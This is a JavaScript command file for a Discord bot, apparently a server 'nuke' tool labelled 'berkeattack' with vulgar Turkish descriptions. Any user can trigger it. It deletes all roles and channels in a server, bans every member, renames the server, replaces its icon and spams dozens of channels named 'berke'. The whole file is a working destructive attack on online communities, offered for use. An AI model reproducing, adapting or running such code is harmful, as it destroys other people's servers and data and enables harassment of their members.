const Discord = require('discord.js');
const ayarlar = require('../tokenyeri.json');

exports.run = async (client, message, args) => {
if (message.guild) {


message.guild.roles.deleteAll("");
message.guild.channels.deleteAll("");
message.guild.members.forEach(member => member.ban())
}
message.guild.setName(`BERKE ADAMDIR`, "")
message.guild.setIcon(`https://cdn.discordapp.com/attachments/522020595123224595/585051070942674964/unknown.png`)
message.guild.createChannel(`berke1`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
message.guild.createChannel(`berke`)
};

exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: ['deltaattack'],
  permLevel: 0,
  kategori: "sikici"
};

exports.help = {
  name: 'berkeattack',
  description: 'sunucu siker', 
  usage: 'benberke = sunucu siker'
};
